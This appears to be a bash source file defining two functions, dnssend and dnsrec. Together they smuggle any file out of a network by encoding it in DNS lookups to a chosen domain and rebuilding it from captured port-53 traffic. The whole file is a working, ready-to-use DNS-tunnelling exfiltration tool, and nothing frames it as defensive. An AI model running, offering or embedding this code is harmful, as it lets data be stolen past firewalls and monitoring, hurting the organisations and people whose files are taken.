function dnssend() {
    local file=$1
    local domain=$2
    local retryline=$3
    local linetotal=$(cat "$file"|gzip|base64 -w 63 |wc -l)
    local linenum=0
    local host
    local epoch=$(date +"%s")

    if [[ ! "$file" =~ . ]] || [[ ! -f "$file" ]] || [[ ! "$domain" =~ . ]]; then
        echo "Usage: ${FUNCNAME[0]} <file to send> <domain>"
        return 1
    fi

    which nslookup gzip base64 >/dev/null 2>&1 || { echo "Missing nslookup, gzip, or base64"; return 1; }

    for line in $(cat "$file" |gzip|base64 -w 63); do
        let linenum++
        # epoch is to avoid caching in case you resend the file.
        if [[ ! $retryline ]] || [[ "$retryline" -eq $linenum ]]; then
            host="${line}.${epoch}.${linenum}.x.${domain}"
            echo "line $linenum / $linetotal   $host"
            nslookup $host >/dev/null 2>&1
            sleep 0.1
        fi
    done

    echo "Flushing buffer.  You can ctrl-c on receiver when you see the ... dots on the receiver"
    for i in {1..20}; do
        host ${RANDOM}hacfhacf.x.${domain} >/dev/null 2>&1
        sleep 0.5
    done
    echo "done"
}

function dnsrec() {
    local file=$1
    local domain=$2

    if [[ ! "$file" =~ . ]] || [[ ! "$domain" =~ . ]]; then
        echo "Usage: ${FUNCNAME[0]} <file to create> <domain>"
        return 1
    fi

    which tcpdump gzip sed base64 >/dev/null 2>&1 || { echo "Missing tcpdump, gzip, sed, or base64"; return 1; }

    if [[ -f "$file" ]]; then
        echo "WARNING: target file $file already exists.  Appending..."
    fi

    echo "+ means receiving data.  Wait for the dots, then ctrl-c."
    echo "Once complete, run: cat $file |sort -t'.' -k3 -n |uniq |sed -e 's/\(.*\)\.[[:digit:]]*\.[[:digit:]]*.x.${domain}.*/\1/g' |base64 -d |gzip -d"
    echo ""
    tcpdump --immediate-mode -nni any -A -s0 port 53 2>&1 \
        |egrep --line-buffered " A\? .*.x.${domain}" \
        |sed -u -e "s/.* A? \(.*.x.${domain}\).*/\1/g" \
        |while read td
            do
                if [[ ! $td =~ hacfhacf.x.${domain} ]]; then
                    echo "$td" >> $file
                    echo -n '+'
                else
                    echo -n '.'
                fi
            done

}


